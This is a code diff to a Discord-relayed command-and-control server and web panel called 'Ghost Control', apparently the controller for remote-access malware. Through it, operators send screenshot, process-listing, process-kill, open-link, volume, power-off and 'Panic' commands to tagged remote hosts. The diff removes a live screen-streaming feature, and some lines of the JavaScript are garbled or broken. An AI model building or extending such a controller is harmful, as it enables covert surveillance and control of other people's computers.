@@ -47,7 +47,7 @@ CONTROLLER_TOKEN = os.getenv("CONTROLLER_TOKEN", "")
 COMMAND_CHANNEL_ID = int(os.getenv("COMMAND_CHANNEL_ID", "0"))
 TARGET_CHANNEL_ID  = int(os.getenv("TARGET_CHANNEL_ID", "0"))
 BOT_TAG = "[BOT1]"
-TAG_BROADCAST_CHANNEL_ID = 1450113302104641618  # channel to post discovered tags
+TAG_BROADCAST_CHANNEL_ID = 1450113302104641618
 
 assert CONTROLLER_TOKEN, "Set CONTROLLER_TOKEN env var"
 assert COMMAND_CHANNEL_ID and TARGET_CHANNEL_ID, "Set COMMAND/TARGET channel IDs"
@@ -240,7 +240,6 @@ async def on_message(message: discord.Message):
                 await tag_ch.send(f"Discovered receiver tag: {tag}")
             except Exception as exc:
                 print(f"[TAG] failed to broadcast {tag}: {exc}")
-        is_live_frame = "LIVE_STREAM_FRAME" in (message.content or "")
         payload = {
             "type": "text",
             "author": str(message.author),
@@ -248,13 +247,9 @@ async def on_message(message: discord.Message):
             "attachments": [],
             "ts": message.created_at.isoformat(),
             "tag": tag,
-            "is_live_frame": is_live_frame,
         }
-        # Save attachments; for live frames keep discord URL to avoid disk writes.
+        # Save any attachments (e.g., screenshot.png)
         for att in message.attachments:
-            if is_live_frame:
-                payload["attachments"].append({"filename": att.filename, "url": att.url})
-                continue
             try:
                 b = await att.read()
                 fname = f"{att.id}_{att.filename}"
@@ -287,10 +282,10 @@ async def files_index(limit: int = 24):
     return {"files": items}
 
 PANEL_HTML = r"""<!doctype html>
-<html lang=\"en\">
+<html lang="en">
 <head>
-  <meta charset=\"utf-8\"/>
-  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"/>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1"/>
   <title>Ghost Control</title>
   <style>
     :root{
@@ -298,7 +293,7 @@ PANEL_HTML = r"""<!doctype html>
       --accent:#b574ff; --accent2:#5bd0ff; --danger:#ff5c8a; --glass:rgba(255,255,255,0.04);
     }
     *{box-sizing:border-box;}
-    body{margin:0; font:15px/1.55 \"Inter\",\"Segoe UI\",Arial,sans-serif; background:radial-gradient(60% 50% at 15% 15%, rgba(181,116,255,.18), transparent), radial-gradient(50% 60% at 85% 0%, rgba(91,208,255,.18), transparent), var(--bg); color:var(--text);}
+    body{margin:0; font:15px/1.55 "Inter","Segoe UI",Arial,sans-serif; background:radial-gradient(60% 50% at 15% 15%, rgba(181,116,255,.18), transparent), radial-gradient(50% 60% at 85% 0%, rgba(91,208,255,.18), transparent), var(--bg); color:var(--text);}
     a{color:inherit;}
     .page{max-width:1240px; margin:0 auto; padding:18px 12px 46px;}
     header.hero{display:flex; flex-wrap:wrap; gap:12px; align-items:center; justify-content:space-between; padding:14px 16px; border:1px solid var(--line); border-radius:16px; background:linear-gradient(135deg, rgba(181,116,255,.16), rgba(15,10,31,.9)); box-shadow:0 25px 60px rgba(0,0,0,.38);}
@@ -312,13 +307,11 @@ PANEL_HTML = r"""<!doctype html>
     .shell{margin-top:16px; border:1px solid var(--line); border-radius:16px; background:var(--panel); box-shadow:0 20px 50px rgba(0,0,0,.35); overflow:hidden;}
     .tabbar{display:flex; gap:8px; padding:10px; border-bottom:1px solid var(--line); background:rgba(22,15,45,.75); overflow-x:auto;}
     .tab-btn{flex:1; min-width:120px; border:1px solid var(--line); background:var(--card); color:var(--text); padding:10px 12px; border-radius:10px; cursor:pointer; font-weight:700; letter-spacing:0.2px; transition:all .18s ease;}
-    .tab-btn.active{background:linear-gradient(120deg,var(--accent),var(--accent2)); color:#080512; border-color:transparent; transform:translateY(-1px); box-shadow:0 12px 30px rgba(128,90,255,.35);}
-    .views{position:relative; min-height:560px;}
+    .tab-btn.active{background:linear-gradient(120deg,var(--accent),var(--accent2)); color:#080512; border-color:transparent; transform:translateY(-1px); box-shadow:0 12px 30px rgba(128,90,255,.35);}    .views{position:relative; min-height:520px;}
     .view{position:absolute; inset:0; padding:18px; opacity:0; transform:translateY(10px); transition:opacity .2s ease, transform .2s ease; pointer-events:none;}
     .view.active{opacity:1; transform:translateY(0); pointer-events:auto;}
-    .grid{display:grid; grid-template-columns:1.15fr .85fr; gap:14px;} @media(max-width:960px){.grid{grid-template-columns:1fr;}}
-    .card{border:1px solid var(--line); border-radius:14px; background:var(--card); padding:14px; box-shadow:0 10px 30px rgba(0,0,0,.25);}
-    .head{display:flex; justify-content:space-between; gap:10px; align-items:center; flex-wrap:wrap; margin-bottom:10px;} h3{margin:0;}
+    .grid{display:grid; grid-template-columns:1.2fr .8fr; gap:14px;} @media(max-width:960px){.grid{grid-template-columns:1fr;}}
+    .card{border:1px solid var(--line); border-radius:14px; background:var(--card); padding:14px; box-shadow:0 10px 30px rgba(0,0,0,.25);}    .head{display:flex; justify-content:space-between; gap:10px; align-items:center; flex-wrap:wrap; margin-bottom:10px;} h3{margin:0;}
     .btn{border:1px solid var(--line); background:var(--glass); color:var(--text); padding:9px 12px; border-radius:10px; font-weight:700; cursor:pointer; transition:transform .08s ease, filter .15s ease;} .btn:hover{filter:brightness(1.08); transform:translateY(-1px);} .btn.primary{background:linear-gradient(120deg,var(--accent),var(--accent2)); color:#0b0b18; border:none;} .btn.danger{background:var(--danger); border-color:var(--danger); color:#0b0b18;} .btn.small{padding:7px 10px; font-size:13px;}
     .stack{display:grid; gap:10px;} .row{display:flex; gap:8px; flex-wrap:wrap;} input{flex:1; min-width:160px; padding:10px 12px; border-radius:10px; border:1px solid var(--line); background:#0c0a18; color:#f3e8ff;} label{font-weight:700;}
     .feed{display:flex; flex-direction:column; gap:10px; max-height:70vh; min-height:260px; overflow:auto; padding-right:4px;} .feed.small{max-height:60vh; min-height:220px;} .item{border:1px solid var(--line); border-radius:10px; padding:10px 12px; background:rgba(19,11,38,.9);} .meta{font-size:12px; color:var(--muted); margin-bottom:6px; word-break:break-word;}
@@ -330,8 +323,6 @@ PANEL_HTML = r"""<!doctype html>
     .live-frame .muted{position:absolute; inset:auto; margin:auto; text-align:center; color:var(--muted);}
     .live-controls{gap:6px; flex-wrap:wrap;} .input-compact{max-width:90px;}
     .scroll-card{max-height:70vh; overflow:auto;}
-    .loader{position:fixed; inset:0; display:flex; align-items:center; justify-content:center; background:#080510; z-index:200; transition:opacity .3s ease, visibility .3s ease;} .loader.hide{opacity:0; visibility:hidden;} .load-bar{width:240px; height:10px; border-radius:999px; background:rgba(255,255,255,.08); overflow:hidden; box-shadow:0 0 20px rgba(181,116,255,.35);} .load-bar span{display:block; height:100%; width:60%; background:linear-gradient(120deg,var(--accent),var(--accent2)); border-radius:999px; animation:slide 1.2s ease-in-out infinite;}
-    @keyframes slide{0%{transform:translateX(-70%);} 50%{transform:translateX(30%);} 100%{transform:translateX(140%);}}
     @media(max-width:720px){
       body{font-size:14px;}
       .tab-btn{flex:1 0 auto;}
@@ -344,166 +335,116 @@ PANEL_HTML = r"""<!doctype html>
   </style>
 </head>
 <body>
-  <div id=\"loader\" class=\"loader\">
-    <div>
-      <div class=\"load-bar\"><span></span></div>
-      <div id=\"loadPct\" style=\"margin-top:10px; text-align:center; color:var(--muted); font-weight:700;\">0%</div>
-    </div>
-  </div>
-  <div class=\"page\">
-    <header class=\"hero\">
+  <div class="page">
+    <header class="hero">
       <div>
-        <div class=\"eyebrow\">Receiver console</div>
+        <div class="eyebrow">Receiver console</div>
         <h1>Ghost Control</h1>
-        <div class=\"muted\">Purple control surface with live stream + logs.</div>
+        <div class="muted">Purple control surface with live stream + logs.</div>
       </div>
-      <div class=\"status\">
-        <div class=\"pill\"><span id=\"dot\" class=\"dot\"></span><span id=\"stxt\">Connecting...</span></div>
-        <div class=\"pill\">Cmd {COMMAND_CHANNEL_ID}</div>
-        <div class=\"tag-control\">
-          <div class=\"tag-meta\">Target tag</div>
-          <div class=\"tag-row\">
-            <input id=\"tagInput\" list=\"tagOptions\" placeholder=\"[HOST-XXXX]\" value=\"{BOT_TAG}\"/>
-            <datalist id=\"tagOptions\"></datalist>
-            <button class=\"btn small\" onclick=\"chooseTag()\">Use</button>
-            <button class=\"btn small\" onclick=\"refreshTags()\" title=\"Refresh known tags\">&#8635;</button>
+      <div class="status">
+        <div class="pill"><span id="dot" class="dot"></span><span id="stxt">Connecting...</span></div>
+        <div class="pill">Cmd {COMMAND_CHANNEL_ID}</div>
+        <div class="tag-control">
+          <div class="tag-meta">Target tag</div>
+          <div class="tag-row">
+            <input id="tagInput" list="tagOptions" placeholder="[HOST-XXXX]" value="{BOT_TAG}"/>
+            <datalist id="tagOptions"></datalist>
+            <button class="btn small" onclick="chooseTag()">Use</button>
+            <button class="btn small" onclick="refreshTags()" title="Refresh known tags">&#8635;</button>
           </div>
-          <div class=\"tag-meta\">Active: <span id=\"tagActive\">{BOT_TAG}</span></div>
+          <div class="tag-meta">Active: <span id="tagActive">{BOT_TAG}</span></div>
         </div>
-        <div class=\"pill\" id=\"uptime\">00:00</div>
+        <div class="pill" id="uptime">00:00</div>
       </div>
     </header>
 
-    <div class=\"shell\">
-      <div class=\"tabbar\">
-        <button class=\"tab-btn active\" data-tab=\"live\">Live</button>
-        <button class=\"tab-btn\" data-tab=\"shots\">Screenshots</button>
-        <button class=\"tab-btn\" data-tab=\"procs\">Processes</button>
-        <button class=\"tab-btn\" data-tab=\"logs\">Logs</button>
+    <div class="shell">
+      <div class="tabbar">
+        <button class="tab-btn active" data-tab="shots">Screenshots</button>
+        <button class="tab-btn" data-tab="procs">Processes</button>
+        <button class="tab-btn" data-tab="logs">Logs</button>
       </div>
-      <div class=\"views\">
-        <section id=\"tab-live\" class=\"view active\">
-          <div class=\"grid\">
-            <div class=\"card\">
-              <div class=\"head\">
-                <div><div class=\"eyebrow\">Live stream</div><h3>Screen share</h3></div>
-                <div id=\"liveControls\" class=\"row live-controls\">
-                  <input id=\"liveMonitor\" class=\"input-compact\" placeholder=\"1\" value=\"1\" title=\"Monitor index\"/>
-                  <button class=\"btn primary\" onclick=\"startLiveStream()\">Start</button>
-                  <button class=\"btn\" onclick=\"stopLiveStream()\">Stop</button>
-                </div>
-              </div>
-              <div id=\"liveGate\" class=\"pill\" style=\"background:var(--glass); color:var(--muted);\">
-                Select a bot first to start a live stream.
-              </div>
-              <div id=\"liveBody\" class=\"live-wrap\">
-                <div class=\"row\" style=\"gap:8px; align-items:center;\">
-                  <div class=\"pill\" style=\"display:flex; gap:8px; align-items:center;\">
-                    <span id=\"liveDot\" class=\"dot\"></span><span id=\"liveStatus\">Idle</span>
-                  </div>
-                </div>
-                <div class=\"live-frame\" id=\"liveFrameWrap\">
-                  <div class=\"muted\" id=\"liveHint\">Press start to request a screenshare.</div>
-                  <img id=\"liveFrame\" alt=\"Live stream\" />
-                </div>
-              </div>
+      <div class="views">
+        <section id="tab-shots" class="view active">
+          <div class="card scroll-card">
+            <div class="head">
+              <div><div class="eyebrow">Captures</div><h3>Screenshots</h3></div>
+              <div class="row"><button class="btn" onclick="doShot()">Take screenshot</button></div>
             </div>
-            <div class=\"card scroll-card\">
-              <div class=\"head\">
-                <div><div class=\"eyebrow\">Live log</div><h3>Events</h3></div>
-              </div>
-              <div id=\"timeline\" class=\"feed\"></div>
-            </div>
+            <div id="gallery" class="gallery"></div>
           </div>
         </section>
 
-        <section id=\"tab-shots\" class=\"view\" aria-hidden=\"true\">
-          <div class=\"card scroll-card\">
-            <div class=\"head\">
-              <div><div class=\"eyebrow\">Captures</div><h3>Screenshots</h3></div>
-              <div class=\"row\"><button class=\"btn\" onclick=\"doShot()\">Take screenshot</button></div>
+        <section id="tab-procs" class="view" aria-hidden="true">
+          <div class="card scroll-card">
+            <div class="head">
+              <div><div class="eyebrow">Processes</div><h3>Process lists</h3></div>
+              <button class="btn" onclick="doProcs()">Refresh</button>
             </div>
-            <div id=\"gallery\" class=\"gallery\"></div>
+            <div class="stack" style="margin-bottom:10px;">
+              <label for="procName">Kill process</label>
+              <div class="row">
+                <input id="procName" placeholder="chrome.exe"/>
+                <button class="btn danger" onclick="killProc()">Kill</button>
+              </div>
+            </div>
+            <div id="procFeed" class="feed small"></div>
           </div>
         </section>
 
-        <section id=\"tab-procs\" class=\"view\" aria-hidden=\"true\">
-          <div class=\"card scroll-card\">
-            <div class=\"head\">
-              <div><div class=\"eyebrow\">Processes</div><h3>Process lists</h3></div>
-              <button class=\"btn\" onclick=\"doProcs()\">Refresh</button>
-            </div>
-            <div class=\"stack\" style=\"margin-bottom:10px;\">
-              <label for=\"procName\">Kill process</label>
-              <div class=\"row\">
-                <input id=\"procName\" placeholder=\"chrome.exe\"/>
-                <button class=\"btn danger\" onclick=\"killProc()\">Kill</button>
+        <section id="tab-logs" class="view" aria-hidden="true">
+          <div class="card scroll-card">
+            <div class="head">
+              <div><div class="eyebrow">Actions</div><h3>Controls</h3></div>
+              <div class="row" style="gap:6px; flex-wrap:wrap;">
+                <button class="btn" onclick="doShot()">Screenshot</button>
+                <button class="btn" onclick="doProcs()">Processes</button>
+                <button class="btn primary" onclick="displayGif()">Display gif</button>
+                <button class="btn danger" onclick="confirmPower()">Power off</button>
+                <button class="btn danger" onclick="confirmPanic()">Panic</button>
               </div>
             </div>
-            <div id=\"procFeed\" class=\"feed small\"></div>
-          </div>
-        </section>
-
-        <section id=\"tab-logs\" class=\"view\" aria-hidden=\"true\">
-          <div class=\"card scroll-card\">
-            <div class=\"head\">
-              <div><div class=\"eyebrow\">Actions</div><h3>Controls</h3></div>
-              <div class=\"row\" style=\"gap:6px; flex-wrap:wrap;\">
-                <button class=\"btn\" onclick=\"doShot()\">Screenshot</button>
-                <button class=\"btn\" onclick=\"doProcs()\">Processes</button>
-                <button class=\"btn primary\" onclick=\"displayGif()\">Display gif</button>
-                <button class=\"btn danger\" onclick=\"confirmPower()\">Power off</button>
-                <button class=\"btn danger\" onclick=\"confirmPanic()\">Panic</button>
+            <div class="stack" style="margin-bottom:10px;">
+              <label for="openUrl">Open link</label>
+              <div class="row">
+                <input id="openUrl" placeholder="https://example.com"/>
+                <button class="btn" onclick="openLink()">Open</button>
+              </div>
+              <label for="volPercent">Set volume (0-100)</label>
+              <div class="row">
+                <input id="volPercent" placeholder="100" value="100" style="max-width:120px"/>
+                <button class="btn" onclick="setVolume()">Set</button>
               </div>
             </div>
-            <div class=\"stack\" style=\"margin-bottom:10px;\">
-              <label for=\"openUrl\">Open link</label>
-              <div class=\"row\">
-                <input id=\"openUrl\" placeholder=\"https://example.com\"/>
-                <button class=\"btn\" onclick=\"openLink()\">Open</button>
-              </div>
-              <label for=\"volPercent\">Set volume (0-100)</label>
-              <div class=\"row\">
-                <input id=\"volPercent\" placeholder=\"100\" value=\"100\" style=\"max-width:120px\"/>
-                <button class=\"btn\" onclick=\"setVolume()\">Set</button>
-              </div>
+            <div class="head" style="margin-top:4px;">
+              <div><div class="eyebrow">History</div><h3>Logs</h3></div>
+              <button class="btn" onclick="clearLogs()">Clear</button>
             </div>
-            <div class=\"head\" style=\"margin-top:4px;\">
-              <div><div class=\"eyebrow\">History</div><h3>Logs</h3></div>
-              <button class=\"btn\" onclick=\"clearLogs()\">Clear</button>
-            </div>
-            <div id=\"logFeed\" class=\"feed small\"></div>
+            <div id="logFeed" class="feed small"></div>
           </div>
         </section>
       </div>
     </div>
   </div>
 
-  <div id=\"toast\"></div>
+  <div id="toast"></div>
 
   <script>
     const el = {
       dot:document.getElementById('dot'), stxt:document.getElementById('stxt'), timeline:document.getElementById('timeline'),
       gallery:document.getElementById('gallery'), procFeed:document.getElementById('procFeed'), logFeed:document.getElementById('logFeed'),
       uptime:document.getElementById('uptime'), tagActive:document.getElementById('tagActive'), tagInput:document.getElementById('tagInput'),
-      liveStatus:document.getElementById('liveStatus'), liveDot:document.getElementById('liveDot'),
+      tagList:document.getElementById('tagList'), liveStatus:document.getElementById('liveStatus'), liveDot:document.getElementById('liveDot'),
       liveFrame:document.getElementById('liveFrame'), liveGate:document.getElementById('liveGate'), liveBody:document.getElementById('liveBody'),
-      liveHint:document.getElementById('liveHint'), liveControls:document.getElementById('liveControls'), liveMonitor:document.getElementById('liveMonitor'),
-      loader:document.getElementById('loader'), loadPct:document.getElementById('loadPct')
+      liveHint:document.getElementById('liveHint'), liveControls:document.getElementById('liveControls'), liveMonitor:document.getElementById('liveMonitor')
     };
-    const defaultTag = "{BOT_TAG}";
+    const defaultTag = {BOT_TAG};
     let currentTag = defaultTag;
     let knownTags = new Set([currentTag]);
     let hasSelectedTag = false;
     let liveActive = false;
-    let startedAt = Date.now();
-    setInterval(()=>{
-      const s=((Date.now()-startedAt)/1000|0); const m=(s/60|0), ss=s%60;
-      el.uptime.textContent=${String(m).padStart(2,'0')}:;
-    },1000);
-    let pct=0; const tick=()=>{ pct=Math.min(100,pct+Math.random()*20); if(el.loadPct) el.loadPct.textContent=${pct.toFixed(0)}%; if(pct<100) setTimeout(tick,240); else setTimeout(()=> el.loader?.classList.add('hide'), 200); }; tick();
-    window.addEventListener('load', ()=> setTimeout(()=> el.loader?.classList.add('hide'), 250));
-
+    let startedAt = Date.now(); setInterval(()=>{ const s=((Date.now()-startedAt)/1000|0); const m=(s/60|0), ss=s%60; el.uptime.textContent=`${String(m).padStart(2,'0')}:${String(ss).padStart(2,'0')}`; },1000);
     function setStatus(ok){ el.dot.className='dot '+(ok?'ok':'bad'); el.stxt.textContent = ok ? 'Connected' : 'Reconnecting...'; }
     function toast(t){ const n=document.getElementById('toast'); n.textContent=t; n.style.opacity='1'; setTimeout(()=> n.style.opacity='0', 1600); }
 
@@ -516,15 +457,19 @@ PANEL_HTML = r"""<!doctype html>
         Array.from(knownTags).sort().forEach(t=>{ const o=document.createElement('option'); o.value=t; dl.appendChild(o); });
       }
       if(el.tagInput && !el.tagInput.value) el.tagInput.value=currentTag;
+      if(el.tagList){
+        el.tagList.innerHTML='';
+        Array.from(knownTags).sort().forEach(t=>{
+          const chip=document.createElement('div');
+          chip.className='chip';
+          chip.textContent=t;
+          chip.onclick=()=>{ copyTag(t); if(el.tagInput) el.tagInput.value=t; };
+          el.tagList.appendChild(chip);
+        });
+      }
       updateLiveGate();
     }
-    function updateLiveGate(){
-      const ready=hasSelectedTag || (currentTag && currentTag!==defaultTag);
-      if(ready) hasSelectedTag=true;
-      if(el.liveGate) el.liveGate.style.display = ready?'none':'flex';
-      if(el.liveBody) el.liveBody.style.opacity = ready?'1':'0.45';
-      if(el.liveControls){ el.liveControls.querySelectorAll('button').forEach(b=> b.disabled=!ready); }
-    }
+    function updateLiveGate(){ const ready=hasSelectedTag || (currentTag && currentTag!==defaultTag); if(ready) hasSelectedTag=true; if(el.liveGate) el.liveGate.style.display = ready?'none':'flex'; if(el.liveBody) el.liveBody.style.opacity = ready?'1':'0.45'; if(el.liveControls){ el.liveControls.querySelectorAll('button').forEach(b=> b.disabled=!ready); } }
     async function refreshTags(){ try{ const r = await fetch('/tags'); const data = await r.json().catch(()=>({})); if(data.tags) knownTags = new Set(data.tags); if(data.active) currentTag = data.active; if(currentTag && currentTag!==defaultTag) hasSelectedTag=true; } catch(e){} renderTags(); updateLiveGate(); }
     async function chooseTag(){ const val=(el.tagInput?.value||'').trim(); if(!val){ toast('Enter a tag'); return; } currentTag = val; hasSelectedTag=true; try{ const r = await fetch('/tags/select?tag='+encodeURIComponent(val), {method:'POST'}); const data = await r.json().catch(()=>({})); if(data.tags) knownTags = new Set(data.tags); if(data.active) currentTag = data.active; toast('Now targeting '+currentTag); } catch(e){ toast('Could not set tag'); } renderTags(); updateLiveGate(); }
     function withTag(path){ const u=new URL(path, window.location.origin); if(currentTag) u.searchParams.set('tag', currentTag); return u.pathname + u.search; }
@@ -540,14 +485,7 @@ PANEL_HTML = r"""<!doctype html>
       }
     }
 
-    function node(author, content, ts){
-      const d=document.createElement('div'); d.className='item';
-      const m=document.createElement('div'); m.className='meta';
-      const time=ts? new Date(ts).toLocaleString(): new Date().toLocaleString();
-      m.textContent = ${time} - ;
-      const b=document.createElement('div'); b.textContent = content || '';
-      d.appendChild(m); d.appendChild(b); return d;
-    }
+    function node(author, content, ts){ const d=document.createElement('div'); d.className='item'; const m=document.createElement('div'); m.className='meta'; const time=ts? new Date(ts).toLocaleString(): new Date().toLocaleString(); m.textContent = `${time} - ${author}`; const b=document.createElement('div'); b.textContent = content || ''; d.appendChild(m); d.appendChild(b); return d; }
     function addFeed(container, div, limit=200){ container.prepend(div); while(container.children.length>limit) container.lastChild.remove(); }
     function addShot(url){ if(!url) return; const wrap=document.createElement('div'); wrap.className='shot'; const img=document.createElement('img'); img.loading='lazy'; img.src=url; wrap.onclick=()=> window.open(url,'_blank'); wrap.appendChild(img); el.gallery.prepend(wrap); while(el.gallery.children.length>80) el.gallery.lastChild.remove(); }
     function addProc(text){ addFeed(el.procFeed, node('Processes', text, Date.now()), 120); }
@@ -555,7 +493,7 @@ PANEL_HTML = r"""<!doctype html>
 
     function setTab(id){
       ['live','shots','procs','logs'].forEach(t=>{
-        const view=document.getElementById(	ab-);
+        const view=document.getElementById(`tab-${t}`);
         const active=t===id;
         view.classList.toggle('active', active);
         view.setAttribute('aria-hidden', active?'false':'true');
@@ -564,70 +502,13 @@ PANEL_HTML = r"""<!doctype html>
     }
     document.querySelectorAll('.tab-btn').forEach(btn=> btn.onclick = ()=> setTab(btn.dataset.tab));
 
-    function setLiveStatus(text, state='idle'){
-      liveActive = state==='ok';
-      if(el.liveStatus) el.liveStatus.textContent=text;
-      if(el.liveDot){ el.liveDot.className='dot'+(state==='ok'?' ok': state==='error'?' bad':''); }
-      if(state!=='ok' && el.liveFrame){
-        el.liveFrame.removeAttribute('src');
-        const wrap=document.getElementById('liveFrameWrap'); if(wrap) wrap.classList.remove('active');
-        if(el.liveHint) el.liveHint.style.display='block';
-      }
-    }
-
-    function handleLiveFrame(obj){
-      if(!(obj.attachments&&obj.attachments.length)) return;
-      const url=obj.attachments[0].url+(obj.attachments[0].url.includes('?')?'&':'?')+'t='+(Date.now());
-      const wrap=document.getElementById('liveFrameWrap');
-      if(el.liveFrame){
-        el.liveFrame.src=url;
-        if(wrap) wrap.classList.add('active');
-        el.liveFrame.style.display='block';
-        if(el.liveHint) el.liveHint.style.display='none';
-        el.liveFrame.onload=()=> wrap?.classList.add('active');
-        el.liveFrame.onerror=()=> setLiveStatus('Stream error', 'error');
-      }
-      setLiveStatus('Receiving frames', 'ok');
-    }
-
-    function connectWS(){
-      setStatus(false);
-      const ws = new WebSocket((location.protocol==='https:'?'wss://':'ws://') + location.host + '/ws');
-      ws.onopen = ()=> setStatus(true);
-      ws.onclose = ()=> { setStatus(false); setTimeout(connectWS, 1200); };
-      ws.onmessage = ev => {
-        const obj = JSON.parse(ev.data);
-        if(obj.type !== 'text') return;
-        const content=(obj.content||'');
-        touchTagFromMessage(obj);
-        const isLiveFrame = obj.is_live_frame === true || content.toUpperCase().includes('LIVE_STREAM_FRAME');
-        const isLiveStopped = content.toUpperCase().includes('LIVE_STREAM_STOPPED');
-        const isLiveError = content.toUpperCase().includes('LIVE_STREAM_ERROR');
-        if(isLiveFrame){ handleLiveFrame(obj); return; }
-        if(isLiveStopped){ setLiveStatus('Stopped', 'idle'); }
-        if(isLiveError){ setLiveStatus('Stream error', 'error'); }
-        const msg = node(obj.author, obj.content, obj.ts);
-        addFeed(el.timeline, msg.cloneNode(true));
-        addLog(msg.cloneNode(true));
-        if(content.toLowerCase().includes('filtered running processes')) addFeed(el.procFeed, msg.cloneNode(true));
-        if(obj.attachments && obj.attachments.length){ obj.attachments.forEach(a=> addShot(a.url)); }
-      };
-    }
+    function setLiveStatus(text, state='idle'){ liveActive = state==='ok'; if(el.liveStatus) el.liveStatus.textContent=text; if(el.liveDot){ el.liveDot.className='dot'+(state==='ok'?' ok': state==='error'?' bad':''); } if(state!=='ok' && el.liveFrame){ el.liveFrame.removeAttribute('src'); const wrap=document.getElementById('liveFrameWrap'); if(wrap) wrap.classList.remove('active'); if(el.liveHint) el.liveHint.style.display='block'; } }
+    function connectWS(){ setStatus(false); const ws = new WebSocket((location.protocol==='https:'?'wss://':'ws://') + location.host + '/ws'); ws.onopen = ()=> setStatus(true); ws.onclose = ()=> { setStatus(false); setTimeout(connectWS, 1200); }; ws.onmessage = ev => { const obj = JSON.parse(ev.data); if(obj.type !== 'text') return; touchTagFromMessage(obj); const msg = node(obj.author, obj.content, obj.ts); addFeed(el.timeline, msg.cloneNode(true)); addLog(msg.cloneNode(true)); if((obj.content||'').toLowerCase().includes('filtered running processes')) addFeed(el.procFeed, msg.cloneNode(true)); if(obj.attachments && obj.attachments.length){ obj.attachments.forEach(a=> addShot(a.url)); } }; }
     connectWS(); refreshTags(); renderTags();
 
     async function post(path){ const r = await fetch(withTag(path),{method:'POST'}); const data = await r.json().catch(()=>({})); if(!r.ok) throw new Error(data.error||'Request failed'); return data; }
-    async function startLiveStream(){
-      if(!hasSelectedTag){ toast('Select a bot first'); setTab('live'); updateLiveGate(); return; }
-      const monitor=(el.liveMonitor?.value||'1');
-      setLiveStatus('Requesting stream...', 'pending');
-      try{ await post('/cmd/live/start?monitor='+encodeURIComponent(monitor)); toast('Live request sent'); setLiveStatus('Waiting for frames...', 'pending'); }
-      catch(e){ setLiveStatus('Start failed', 'error'); toast(e.message); }
-    }
-    async function stopLiveStream(){
-      if(!hasSelectedTag){ toast('Select a bot first'); return; }
-      try{ await post('/cmd/live/stop'); toast('Stop request sent'); setLiveStatus('Stopping...', 'pending'); }
-      catch(e){ toast(e.message); }
-    }
+    function startLiveStream(){ toast('Live streaming is disabled.'); setLiveStatus('Disabled', 'idle'); }
+    function stopLiveStream(){ toast('Live streaming is disabled.'); setLiveStatus('Disabled', 'idle'); }
     async function doShot(){ try{ await post('/cmd/ss'); toast('Screenshot requested'); } catch(e){ toast(e.message);} }
     async function doProcs(){ try{ await post('/cmd/ps'); toast('Process list requested'); } catch(e){ toast(e.message);} }
     async function openLink(){ const url=document.getElementById('openUrl').value.trim(); if(!url){toast('Enter a URL'); return;} const safe=(url.startsWith('http://')||url.startsWith('https://'))?url:'http://'+url; try{ await post('/cmd/open?url='+encodeURIComponent(safe)); toast('Open link sent'); } catch(e){ toast(e.message);} }
@@ -738,19 +619,6 @@ async def cmd_set_volume(pct: float = Query(100.0), tag: str = Query(None)):
         return JSONResponse({"ok": False, "error": "Invalid percent"}, status_code=400)
     await _send_cmd(f"{_resolve_tag(tag)} SET_VOLUME {pct_val}")
     return JSONResponse({"ok": True, "pct": pct_val})
-
-@app.post("/cmd/live/start")
-async def cmd_live_start(
-    monitor: int = Query(1, ge=1),
-    tag: str = Query(None),
-):
-    await _send_cmd(f"{_resolve_tag(tag)} LIVE_STREAM_START {monitor}")
-    return JSONResponse({"ok": True, "monitor": monitor, "mode": "discord"})
-
-@app.post("/cmd/live/stop")
-async def cmd_live_stop(tag: str = Query(None)):
-    await _send_cmd(f"{_resolve_tag(tag)} LIVE_STREAM_STOP")
-    return JSONResponse({"ok": True})
 
 @app.post("/cmd/display_gif")
 async def cmd_display_gif(tag: str = Query(None)):
